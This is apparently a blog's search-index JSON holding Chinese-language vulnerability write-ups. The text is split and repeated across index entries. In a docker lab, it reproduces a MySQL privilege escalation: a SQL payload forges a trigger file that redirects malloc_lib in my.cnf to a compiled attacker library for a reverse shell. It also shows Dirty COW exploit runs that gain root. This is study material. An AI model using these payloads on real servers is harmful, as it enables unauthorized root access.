{"config":{"indexing":"full","lang":["en","ja"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\u200b\\-]"},"docs":[{"location":"","text":"ctf   DDCTF   2018   web   writeup   HITB - XCTF   2018   web   writeup   python   sandbox   escape   SUCTF   2018   \u90e8\u5206 web   writeup   xnuca2020   easyjava \u8bbe\u8ba1 \u601d\u8def   java   Struts2 \u547d\u4ee4 \u6267\u884c \u5404 \u7248\u672c \u8bb0\u5f55   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections1   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections3   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections5 , 6 , 7 , 9 , 10   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections2 , 4 , 8   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b Shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u653b\u51fb Java   JMX - RMI   JNDI   with   LDAP   JNDI   with   RMI   \u6d45\u8c08 Java   RMI   Registry \u5b89\u5168 \u95ee\u9898   \u6d45\u8c08 fastjson \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u56de\u987e XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   struts2 \u5386\u53f2 \u6f0f\u6d1e \u5206\u6790   \u5982\u4f55 \u9ad8\u6548 \u7684 \u6316\u6398 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   \u5982\u4f55 \u9ad8\u6548 \u5730 \u6361\u6f0f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   XStream   1.4 . 15   Blacklist   Bypass   \u6f0f\u6d1e \u5206\u6790   MYSQL \u63d0\u6743 \u5206\u6790   CVE - 2016 - 5195   Dirtycow   wordpress   SSRF   < 4.5   bluecms   v1.6   Sql   Injection   \u5206\u6790   DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf \u524d\u53f0 \u76f2\u6ce8   seacms   v6.5   \u524d\u53f0 getshell   MovieGuide   v2.0   SQLi   mycncart   sqli   temmoku   home \u7248   t1.15   \u524d\u53f0 sqli   thinkphp   v5 . x   App . php   s \u53c2\u6570 RCE   thinkphp   v5.2 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398   thinkphp   v6.0 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398","title":"Home"},{"location":"#ctf","text":"DDCTF   2018   web   writeup   HITB - XCTF   2018   web   writeup   python   sandbox   escape   SUCTF   2018   \u90e8\u5206 web   writeup   xnuca2020   easyjava \u8bbe\u8ba1 \u601d\u8def","title":"ctf"},{"location":"#java","text":"Struts2 \u547d\u4ee4 \u6267\u884c \u5404 \u7248\u672c \u8bb0\u5f55   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections1   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections3   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections5 , 6 , 7 , 9 , 10   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b CommonsCollections2 , 4 , 8   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \u4e4b Shiro \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u653b\u51fb Java   JMX - RMI   JNDI   with   LDAP   JNDI   with   RMI   \u6d45\u8c08 Java   RMI   Registry \u5b89\u5168 \u95ee\u9898   \u6d45\u8c08 fastjson \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u56de\u987e XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   struts2 \u5386\u53f2 \u6f0f\u6d1e \u5206\u6790   \u5982\u4f55 \u9ad8\u6548 \u7684 \u6316\u6398 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   \u5982\u4f55 \u9ad8\u6548 \u5730 \u6361\u6f0f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f   XStream   1.4 . 15   Blacklist   Bypass","title":"java"},{"location":"#_1","text":"MYSQL \u63d0\u6743 \u5206\u6790   CVE - 2016 - 5195   Dirtycow   wordpress   SSRF   < 4.5   bluecms   v1.6   Sql   Injection   \u5206\u6790   DM \u4f01\u4e1a \u5efa \u7ad9 \u7cfb\u7edf \u524d\u53f0 \u76f2\u6ce8   seacms   v6.5   \u524d\u53f0 getshell   MovieGuide   v2.0   SQLi   mycncart   sqli   temmoku   home \u7248   t1.15   \u524d\u53f0 sqli   thinkphp   v5 . x   App . php   s \u53c2\u6570 RCE   thinkphp   v5.2 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398   thinkphp   v6.0 . x   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398","title":"\u6f0f\u6d1e \u5206\u6790"},{"location":"about/","text":"About   Me   A   program   analysis   enthusiasts   \ud83d\ude04   A   researcher   on   java   code   review   ( semi - auto   and   manual )   and   redteam   \ud83e\udd14   A   former   ctfer   at   NeSE   \ud83c\udf75   And   currently   work   on   MYbank   \ud83d\udc1c   You   can   reach   me   with   [ wh1t3p1g # gmail . com ]   Open   Source   Tools   ysomap   :   A   helpful   Java   Deserialization   Exploit   Framework .   tabby   :   A   CAT   called   tabby   (   Code   Analysis   Tool   ) .   tabby - path - finder   :   A   neo4j   procedure   for   tabby .","title":"About   Me"},{"location":"about/#about-me","text":"A   program   analysis   enthusiasts   \ud83d\ude04   A   researcher   on   java   code   review   ( semi - auto   and   manual )   and   redteam   \ud83e\udd14   A   former   ctfer   at   NeSE   \ud83c\udf75   And   currently   work   on   MYbank   \ud83d\udc1c   You   can   reach   me   with   [ wh1t3p1g # gmail . com ]","title":"About   Me"},{"location":"about/#open-source-tools","text":"ysomap   :   A   helpful   Java   Deserialization   Exploit   Framework .   tabby   :   A   CAT   called   tabby   (   Code   Analysis   Tool   ) .   tabby - path - finder   :   A   neo4j   procedure   for   tabby .","title":"Open   Source   Tools"},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u51e0\u5929 \u524d\u51fa \u4e86 mysql \u672c\u5730 \u63d0\u6743 \u7684 0day \uff0c \u867d\u7136 \u73b0\u5728 \u5b98\u65b9 \u5df2\u7ecf \u51fa \u4e86 \u8865\u4e01 \uff0c \u4f46\u662f \u53d7 \u5f71\u54cd \u7684 \u4e3b\u673a \u8fd8\u662f \u633a \u591a \u7684 \u3002 \u8ddf\u8fdb \u64cd\u4f5c \u4e00\u904d \uff1a \uff09   \u6f0f\u6d1e \u5f71\u54cd   MySQL   < =   5.7 . 15   \u8fdc\u7a0b \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c /   \u63d0\u6743   ( 0day )   5.6 . 33   5.5 . 52   Mysql \u5206\u652f \u7684 \u7248\u672c \u4e5f \u53d7 \u5f71\u54cd , \u5305\u62ec \uff1a   MariaDB   PerconaDB   \u5b9e\u9a8c \u5206\u6790   \u8fd9\u6b21 \u5b9e\u9a8c \u4e3b\u8981 \u4f7f\u7528 docker \u642d\u5efa \u73af\u5883 \uff0c \u6709 \u9700\u8981 \u7684 \u540c\u5b66 \u53ef\u4ee5 pull \u6211 \u7684 \u5e93 \u73a9   0kami / vulenv : cve - 2016 - 6663   \u5b9e\u9a8c \u4e3b\u8981 \u4ece attacker \u7684 \u89d2\u5ea6 \u5165\u624b \uff0c \u9884\u5148 \u62e5\u6709 \u7684 \u6743\u9650 \uff1a   mysql   \u8d26\u6237 \u62e5\u6709 file \u6743\u9650   bob / bob   exp   mysql _ hookandroot _ lib . c   mysql - server - 5.6   my . cnf \u53ef \u88ab mysql \u7ec4 \u6539\u5199 \u5199   \u5148 \u67e5\u770b \u4e00\u4e0b \u7248\u672c \u4fe1\u606f \u7248\u672c\u4fe1\u606f   \u5c06   / etc / mysql / my . cnf   \u6743\u9650 \u4fee\u6539 \u6389   \u521b\u5efa bob \u7528\u6237 \uff0c \u5e76 \u8d4b\u4e88 file \uff0c select \uff0c insert \u6743\u9650 \uff0c \u521b\u5efa \u7528\u4e8e \u5b9e\u9a8c \u7684 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 activedb \u548c\u8868 active _ table   \u5c06 exp \u5148 \u5199\u5165 tmp \u76ee\u5f55 \uff0c \u5e76 \u7f16\u8bd1 \u8bd1\u6210 \u7f16\u8bd1\u6210 so \u6587\u4ef6 \uff0c \u9700\u8981 \u4fee\u6539 \u4e00\u4e0b ip \uff0c port \u548c my . cnf \u7684 \u4f4d\u7f6e   gcc   - Wall   - fPIC   - shared   - o   mysql _ hookandroot _ lib . c . so   mysql _ hookandroot _ lib . c . c   - ldl   \u6700\u540e \u4e00\u6b65 \u5c31\u662f \u51c6\u5907 \u4e00\u4e0b active _ table \u7684 \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668 \u4e86 \uff0c \u6211\u4eec \u53ef\u4ee5 \u73b0\u5728 \u81ea\u5df1 \u7535\u8111 \u4e0a root \u7528\u6237 \u6743\u9650 \u4e0b \u751f\u6210 \u4e00\u4e2a tragger   \u5728 activedb \u6570\u636e \u4e0b\u4f1a \u751f\u6210 \u4e00\u4e2a \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668   \u5230 \u6b64 \u4f4d\u7f6e \u6211\u4eec \u6240\u6709 \u7684 \u51c6\u5907 \u5de5\u4f5c \u90fd \u505a\u597d \u4e86 \u3002 \u8ba9 \u6211\u4eec \u7528 bob \u7528\u6237 \u6765 \u5f39\u4e2a shell \u5427   select   \" TYPE = TRIGGERS \\ ntriggers = ' CREATE   DEFINER = ` root ` @ ` localhost `   TRIGGER   active _ table \\ nAFTER   INSERT \\ n   ON   ` active _ table `   FOR   EACH   ROW \\ nBEGIN \\ n   DECLARE   void   varchar ( 550 ) ; \\ n   set   global   general _ log _ file = \\ \\ \\ ' / etc / mysql / my . cnf \\ \\ \\ ' ; \\ n   set   global   general _ log   =   on ; \\ n   select   \\ \" \\ n [ mysqld ] \\ nmalloc _ lib = \\ \\ \\ ' / tmp / mysql _ hookandroot _ lib . so \\ \\ \\ ' \\ n \\ \"   INTO   void ;   \\ n   set   global   general _ log   =   off ; \\ nEND ' \\ nsql _ modes = 1073741824 \\ ndefiners = ' root @ localhost ' \\ nclient _ cs _ names = ' latin1 ' \\ nconnection _ cl _ names = ' latin1 _ swedish _ ci ' \\ ndb _ cl _ names = ' latin1 _ swedish _ ci ' \"   into   dumpfile   ' / var / lib / mysql / activedb / active _ table . TRG ' ;   \u7528 bob \u7684 \u7528\u6237 \u5199\u5165 \u6587\u4ef6 \u4ea7\u751f \u4e00\u4e2a \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668 \uff0c \u8fd9\u4e2a \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668 \u5f53 \u4ea7\u751f insert \u65f6 \u89e6\u53d1   \u6765 \u67e5\u770b \u4e00\u4e0b \uff0c \u6267\u884c \u540e \u7684   / etc / mysql / my . cnf   \u7684 \u5185\u5bb9   \u91cd\u542f \u4e00\u4e0b \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \uff0c \u53cd\u5f39 \u4e00\u4e2a shell   \u53d1\u73b0 \u53ef\u5199 \u7684 my . cnf \u4f1a \u88ab \u5ffd\u7565 \uff1f \uff1f \uff1f \u4e0d \u77e5\u9053 \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \uff08 \u96be\u9053 \u8865\u4e01 \u6253\u8865\u4e01 \u4e86 \uff1f \uff09 \uff0c \u4e0d \u77e5\u9053 5.5 \u7684 \u60c5\u51b5 \u4f1a \u600e\u4e48 \u600e\u4e48\u6837 \uff0c \u6240\u4ee5 \u5148 \u628a my . cnf \u7684 \u6743\u9650 \u6539\u56de \u56de\u6765 \u6539\u56de\u6765 744   \u6210\u529f \u53cd\u5f39 \u4e00\u4e2a shell \uff0c \u8fd9\u8fb9 \u8fd4\u56de \u7684 \u4e00\u4e2a shell \u662f mysql \u6743\u9650 \u7684   \u56e0\u4e3a \u662f\u56e0\u4e3a \u6211 \u6d4b\u8bd5 \u7684 \u73af\u5883 mysqld _ safe \u662f \u4ee5 mysql \u6743\u9650 \u8fd0\u884c \u7684 \uff0c \u6240\u4ee5 \u5f39\u51fa \u51fa\u6765 \u5f39\u51fa\u6765 \u7684 \u6743\u9650 \u662f mysql \u7684 \uff0c \u4f46\u662f \u5982\u679c mysqld _ safe \u662f \u4ee5 root \u6743\u9650 \u8fd0\u884c \uff0c \u90a3\u4e48 \u53cd\u5f39 \u7684 shell \u5c31\u662f root \u6743\u9650 \u7684 \uff0c \u9020\u6210 \u63d0\u6743 \u3002   \u603b\u7ed3   \u6d4b\u8bd5 \u73af\u5883 \u6d4b\u8bd5\u73af\u5883 \u642d\u5efa \u8fd8\u6709 \u5229\u7528 \u8fc7\u7a0b \u8fd8\u662f \u51fa\u73b0 \u4e86 \u5f88\u591a \u95ee\u9898 \uff0c \u53ef\u5199 \u7684 my . cnf \u4f1a \u88ab \u5ffd\u7565 \u8f7d\u5165 \uff08 \u4e0d \u77e5\u9053 \u4e0d\u662f \u662f\u4e0d\u662f \u56e0\u4e3a \u4fee\u590d \u8fc7 \u7684 \u539f\u56e0 \uff09 \uff0c triggers \u7684 \u5229\u7528 \uff08 \u53ef\u4ee5 \u540c\u6837 \u5229\u7528 \u5728 \u62e5\u6709 file \u6743\u9650 \u7684 \u60c5\u51b5 \u4e0b \u63d0\u5347 \u6743\u9650 \uff0c \u8fd9\u4e2a \u65f6\u5019 \u5230\u65f6\u5019 \u518d \u6df1\u5165 \u5b66\u4e60 \u4e00\u4e0b \uff09","title":"MYSQL \u63d0\u6743 \u5206\u6790"},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_1","text":"\u51e0\u5929 \u524d\u51fa \u4e86 mysql \u672c\u5730 \u63d0\u6743 \u7684 0day \uff0c \u867d\u7136 \u73b0\u5728 \u5b98\u65b9 \u5df2\u7ecf \u51fa \u4e86 \u8865\u4e01 \uff0c \u4f46\u662f \u53d7 \u5f71\u54cd \u7684 \u4e3b\u673a \u8fd8\u662f \u633a \u591a \u7684 \u3002 \u8ddf\u8fdb \u64cd\u4f5c \u4e00\u904d \uff1a \uff09","title":"\u6982\u8ff0"},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_2","text":"MySQL   < =   5.7 . 15   \u8fdc\u7a0b \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c /   \u63d0\u6743   ( 0day )   5.6 . 33   5.5 . 52   Mysql \u5206\u652f \u7684 \u7248\u672c \u4e5f \u53d7 \u5f71\u54cd , \u5305\u62ec \uff1a   MariaDB   PerconaDB","title":"\u6f0f\u6d1e \u5f71\u54cd"},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_3","text":"\u8fd9\u6b21 \u5b9e\u9a8c \u4e3b\u8981 \u4f7f\u7528 docker \u642d\u5efa \u73af\u5883 \uff0c \u6709 \u9700\u8981 \u7684 \u540c\u5b66 \u53ef\u4ee5 pull \u6211 \u7684 \u5e93 \u73a9   0kami / vulenv : cve - 2016 - 6663   \u5b9e\u9a8c \u4e3b\u8981 \u4ece attacker \u7684 \u89d2\u5ea6 \u5165\u624b \uff0c \u9884\u5148 \u62e5\u6709 \u7684 \u6743\u9650 \uff1a   mysql   \u8d26\u6237 \u62e5\u6709 file \u6743\u9650   bob / bob   exp   mysql _ hookandroot _ lib . c   mysql - server - 5.6   my . cnf \u53ef \u88ab mysql \u7ec4 \u6539\u5199 \u5199   \u5148 \u67e5\u770b \u4e00\u4e0b \u7248\u672c \u4fe1\u606f \u7248\u672c\u4fe1\u606f   \u5c06   / etc / mysql / my . cnf   \u6743\u9650 \u4fee\u6539 \u6389   \u521b\u5efa bob \u7528\u6237 \uff0c \u5e76 \u8d4b\u4e88 file \uff0c select \uff0c insert \u6743\u9650 \uff0c \u521b\u5efa \u7528\u4e8e \u5b9e\u9a8c \u7684 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 activedb \u548c\u8868 active _ table   \u5c06 exp \u5148 \u5199\u5165 tmp \u76ee\u5f55 \uff0c \u5e76 \u7f16\u8bd1 \u8bd1\u6210 \u7f16\u8bd1\u6210 so \u6587\u4ef6 \uff0c \u9700\u8981 \u4fee\u6539 \u4e00\u4e0b ip \uff0c port \u548c my . cnf \u7684 \u4f4d\u7f6e   gcc   - Wall   - fPIC   - shared   - o   mysql _ hookandroot _ lib . c . so   mysql _ hookandroot _ lib . c . c   - ldl   \u6700\u540e \u4e00\u6b65 \u5c31\u662f \u51c6\u5907 \u4e00\u4e0b active _ table \u7684 \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668 \u4e86 \uff0c \u6211\u4eec \u53ef\u4ee5 \u73b0\u5728 \u81ea\u5df1 \u7535\u8111 \u4e0a root \u7528\u6237 \u6743\u9650 \u4e0b \u751f\u6210 \u4e00\u4e2a tragger   \u5728 activedb \u6570\u636e \u4e0b\u4f1a \u751f\u6210 \u4e00\u4e2a \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668   \u5230 \u6b64 \u4f4d\u7f6e \u6211\u4eec \u6240\u6709 \u7684 \u51c6\u5907 \u5de5\u4f5c \u90fd \u505a\u597d \u4e86 \u3002 \u8ba9 \u6211\u4eec \u7528 bob \u7528\u6237 \u6765 \u5f39\u4e2a shell \u5427   select   \" TYPE = TRIGGERS \\ ntriggers = ' CREATE   DEFINER = ` root ` @ ` localhost `   TRIGGER   active _ table \\ nAFTER   INSERT \\ n   ON   ` active _ table `   FOR   EACH   ROW \\ nBEGIN \\ n   DECLARE   void   varchar ( 550 ) ; \\ n   set   global   general _ log _ file = \\ \\ \\ ' / etc / mysql / my . cnf \\ \\ \\ ' ; \\ n   set   global   general _ log   =   on ; \\ n   select   \\ \" \\ n [ mysqld ] \\ nmalloc _ lib = \\ \\ \\ ' / tmp / mysql _ hookandroot _ lib . so \\ \\ \\ ' \\ n \\ \"   INTO   void ;   \\ n   set   global   general _ log   =   off ; \\ nEND ' \\ nsql _ modes = 1073741824 \\ ndefiners = ' root @ localhost ' \\ nclient _ cs _ names = ' latin1 ' \\ nconnection _ cl _ names = ' latin1 _ swedish _ ci ' \\ ndb _ cl _ names = ' latin1 _ swedish _ ci ' \"   into   dumpfile   ' / var / lib / mysql / activedb / active _ table . TRG ' ;   \u7528 bob \u7684 \u7528\u6237 \u5199\u5165 \u6587\u4ef6 \u4ea7\u751f \u4e00\u4e2a \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668 \uff0c \u8fd9\u4e2a \u89e6\u53d1 \u53d1\u5668 \u89e6\u53d1\u5668 \u5f53 \u4ea7\u751f insert \u65f6 \u89e6\u53d1   \u6765 \u67e5\u770b \u4e00\u4e0b \uff0c \u6267\u884c \u540e \u7684   / etc / mysql / my . cnf   \u7684 \u5185\u5bb9   \u91cd\u542f \u4e00\u4e0b \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \uff0c \u53cd\u5f39 \u4e00\u4e2a shell   \u53d1\u73b0 \u53ef\u5199 \u7684 my . cnf \u4f1a \u88ab \u5ffd\u7565 \uff1f \uff1f \uff1f \u4e0d \u77e5\u9053 \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \uff08 \u96be\u9053 \u8865\u4e01 \u6253\u8865\u4e01 \u4e86 \uff1f \uff09 \uff0c \u4e0d \u77e5\u9053 5.5 \u7684 \u60c5\u51b5 \u4f1a \u600e\u4e48 \u600e\u4e48\u6837 \uff0c \u6240\u4ee5 \u5148 \u628a my . cnf \u7684 \u6743\u9650 \u6539\u56de \u56de\u6765 \u6539\u56de\u6765 744   \u6210\u529f \u53cd\u5f39 \u4e00\u4e2a shell \uff0c \u8fd9\u8fb9 \u8fd4\u56de \u7684 \u4e00\u4e2a shell \u662f mysql \u6743\u9650 \u7684   \u56e0\u4e3a \u662f\u56e0\u4e3a \u6211 \u6d4b\u8bd5 \u7684 \u73af\u5883 mysqld _ safe \u662f \u4ee5 mysql \u6743\u9650 \u8fd0\u884c \u7684 \uff0c \u6240\u4ee5 \u5f39\u51fa \u51fa\u6765 \u5f39\u51fa\u6765 \u7684 \u6743\u9650 \u662f mysql \u7684 \uff0c \u4f46\u662f \u5982\u679c mysqld _ safe \u662f \u4ee5 root \u6743\u9650 \u8fd0\u884c \uff0c \u90a3\u4e48 \u53cd\u5f39 \u7684 shell \u5c31\u662f root \u6743\u9650 \u7684 \uff0c \u9020\u6210 \u63d0\u6743 \u3002","title":"\u5b9e\u9a8c \u5206\u6790"},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_4","text":"\u6d4b\u8bd5 \u73af\u5883 \u6d4b\u8bd5\u73af\u5883 \u642d\u5efa \u8fd8\u6709 \u5229\u7528 \u8fc7\u7a0b \u8fd8\u662f \u51fa\u73b0 \u4e86 \u5f88\u591a \u95ee\u9898 \uff0c \u53ef\u5199 \u7684 my . cnf \u4f1a \u88ab \u5ffd\u7565 \u8f7d\u5165 \uff08 \u4e0d \u77e5\u9053 \u4e0d\u662f \u662f\u4e0d\u662f \u56e0\u4e3a \u4fee\u590d \u8fc7 \u7684 \u539f\u56e0 \uff09 \uff0c triggers \u7684 \u5229\u7528 \uff08 \u53ef\u4ee5 \u540c\u6837 \u5229\u7528 \u5728 \u62e5\u6709 file \u6743\u9650 \u7684 \u60c5\u51b5 \u4e0b \u63d0\u5347 \u6743\u9650 \uff0c \u8fd9\u4e2a \u65f6\u5019 \u5230\u65f6\u5019 \u518d \u6df1\u5165 \u5b66\u4e60 \u4e00\u4e0b \uff09","title":"\u603b\u7ed3"},{"location":"blog/2016/old-dirtycow-cve-2016-5195/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u6700\u8fd1 \u51fa\u6765 \u7684 dirtycow \uff0c \u5f71\u54cd \u7248\u672c : Linux   kernel   > =   2.6 . 22 \uff08 2007 \u5e74 \u53d1\u884c \uff0c \u5230 \u4eca\u5e74 10 \u6708 18 \u65e5\u624d \u4fee\u590d \uff09 , \u7528 \u7f51\u4e0a \u7684 EXP \u8bd5 \u4e86 \u4e00\u4e0b \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u8fc7\u7a0b   EXP   https : / / www . exploit - db . com / exploits / 40616 /   \u8fd9\u4e2a EXP \u662f exploitdb \u4e0a \u7684 \uff0c \u4f46\u662f \u5bb9\u6613 \u9020\u6210 \u7cfb\u7edf \u5d29\u6e83 \uff0c \u6210\u529f \u540e \u4f1a \u8fd4\u56de \u4e00\u4e2a root \u6743\u9650 \u7684 shell   okami @ ubuntu14 : ~ $   . / dirtycow   DirtyCow   root   privilege   escalation   Backing   up   / usr / bin / passwd ..   to   / tmp / bak   Size   of   binary :   47032   Racing ,   this   may   take   a   while ..   thread   stopped   thread   stopped   / usr / bin / passwd   is   overwritten   Popping   root   shell .   Don ' t   forget   to   restore   / tmp / bak   root @ ubuntu14 : / home / okami #   id   uid = 0 ( root )   gid = 1000 ( okami )   groups = 0 ( root ) , 4 ( adm ) , 24 ( cdrom ) , 27 ( sudo ) , 30 ( dip ) , 46 ( plugdev ) , 114 ( lpadmin ) , 115 ( sambashare ) , 1000 ( okami )   root @ ubuntu14 : / home / okami #   whoami   root   root @ ubuntu14 : / home / okami #   https : / / github . com / scumjr / dirtycow - vdso   \u8fd9\u4e2a EXP \u4e0d\u4f1a \u51fa\u73b0 \u7cfb\u7edf \u5d29\u6e83 \uff0c \u4f46\u662f \u4f5c\u8005 \u672c\u4eba \u8bf4 \u4e0d\u9002 \u7528\u4e8e \u6240\u6709 linux \u7248\u672c \uff0c \u4e0d\u8fc7 \u8bd5\u9a8c \u4e86 \u4e00\u4e0b \uff0c ubuntu14   16   centOS7 \u90fd \u53ef\u4ee5   okami @ ubuntu14 : ~ $   . / 0xdeadbeef   [ * ]   exploit :   patch   1 / 2   [ * ]   vdso   successfully   backdoored   [ * ]   exploit :   patch   2 / 2   [ * ]   vdso   successfully   backdoored   [ * ]   waiting   for   reverse   connect   shell ...   [ * ]   enjoy !   [ * ]   restore :   patch   2 / 2   [ * ]   vdso   successfully   restored   [ * ]   restore :   patch   1 / 2   [ * ]   vdso   successfully   restored   id   uid = 0 ( root )   gid = 0 ( root )   groups = 0 ( root )   whoami   root   lsb _ release   - a   No   LSB   modules   are   available .   Distributor   ID :   Ubuntu   Description :   Ubuntu   14.04 . 5   LTS   Release :   14.04   Codename :   trusty   \u6ce8\u610f \u8fd9\u91cc \u6709 \u4e00\u6b65 \u662f waiting   for   reverse   connect   shell ... \uff0c \u9700\u8981 \u4e00\u70b9 \u65f6\u95f4 \uff0c \u6210\u529f \u540e \u6709 root \u6743\u9650 \u7684 shell","title":"CVE - 2016 - 5195   Dirtycow"},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#_1","text":"\u6700\u8fd1 \u51fa\u6765 \u7684 dirtycow \uff0c \u5f71\u54cd \u7248\u672c : Linux   kernel   > =   2.6 . 22 \uff08 2007 \u5e74 \u53d1\u884c \uff0c \u5230 \u4eca\u5e74 10 \u6708 18 \u65e5\u624d \u4fee\u590d \uff09 , \u7528 \u7f51\u4e0a \u7684 EXP \u8bd5 \u4e86 \u4e00\u4e0b \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u8fc7\u7a0b","title":"\u6982\u8ff0"},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#exp","text":"","title":"EXP"},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#httpswwwexploit-dbcomexploits40616","text":"\u8fd9\u4e2a EXP \u662f exploitdb \u4e0a \u7684 \uff0c \u4f46\u662f \u5bb9\u6613 \u9020\u6210 \u7cfb\u7edf \u5d29\u6e83 \uff0c \u6210\u529f \u540e \u4f1a \u8fd4\u56de \u4e00\u4e2a root \u6743\u9650 \u7684 shell   okami @ ubuntu14 : ~ $   . / dirtycow   DirtyCow   root   privilege   escalation   Backing   up   / usr / bin / passwd ..   to   / tmp / bak   Size   of   binary :   47032   Racing ,   this   may   take   a   while ..   thread   stopped   thread   stopped   / usr / bin / passwd   is   overwritten   Popping   root   shell .   Don ' t   forget   to   restore   / tmp / bak   root @ ubuntu14 : / home / okami #   id   uid = 0 ( root )   gid = 1000 ( okami )   groups = 0 ( root ) , 4 ( adm ) , 24 ( cdrom ) , 27 ( sudo ) , 30 ( dip ) , 46 ( plugdev ) , 114 ( lpadmin ) , 115 ( sambashare ) , 1000 ( okami )   root @ ubuntu14 : / home / okami #   whoami   root   root @ ubuntu14 : / home / okami #","title":"https : / / www . exploit - db . com / exploits / 40616 /"},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#httpsgithubcomscumjrdirtycow-vdso","text":"\u8fd9\u4e2a EXP \u4e0d\u4f1a \u51fa\u73b0 \u7cfb\u7edf \u5d29\u6e83 \uff0c \u4f46\u662f \u4f5c\u8005 \u672c\u4eba \u8bf4 \u4e0d\u9002 \u7528\u4e8e \u6240\u6709 linux \u7248\u672c \uff0c \u4e0d\u8fc7 \u8bd5\u9a8c \u4e86 \u4e00\u4e0b \uff0c ubuntu14   16   centOS7 \u90fd \u53ef\u4ee5   okami @ ubuntu14 : ~ $   . / 0xdeadbeef   [ * ]   exploit :   patch   1 / 2   [ * ]   vdso   successfully   backdoored   [ * ]   exploit :   patch   2 / 2   [ * ]   vdso   successfully   backdoored   [ * ]   waiting   for   reverse   connect   shell ...   [ * ]   enjoy !   [ * ]   restore :   patch   2 / 2   [ * ]   vdso   successfully   restored   [ * ]   restore :   patch   1 / 2   [ * ]   vdso   successfully   restored   id   uid = 0 ( root )   gid = 0 ( root )   groups = 0 ( root )   whoami   root   lsb _ release   - a   No   LSB   modules   are   available .   Distributor   ID :   Ubuntu   Description :   Ubuntu   14.04 . 5   LTS   Release :   14.04   Codename :   trusty   \u6ce8\u610f \u8fd9\u91cc \u6709 \u4e00\u6b65 \u662f waiting   for   reverse   connect   shell ... \uff0c \u9700\u8981 \u4e00\u70b9 \u65f6\u95f4 \uff0c \u6210\u529f \u540e \u6709 root \u6743\u9650 \u7684 shell","title":"https : / / github . com / scumjr / dirtycow - vdso"},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u524d \u51e0\u5929 \uff0c wordpress \u7206\u51fa \u4e00\u4e2a SSRF \u7684 \u6f0f\u6d1e \uff0c \u8ddf\u8fdb \u4e00\u4e0b \uff0c \u67e5\u9605 \u4e86 \u4e00\u4e0b \uff0c \u7f51\u4e0a \u5e76 \u6ca1\u6709 \u8be6\u7ec6 \u7684 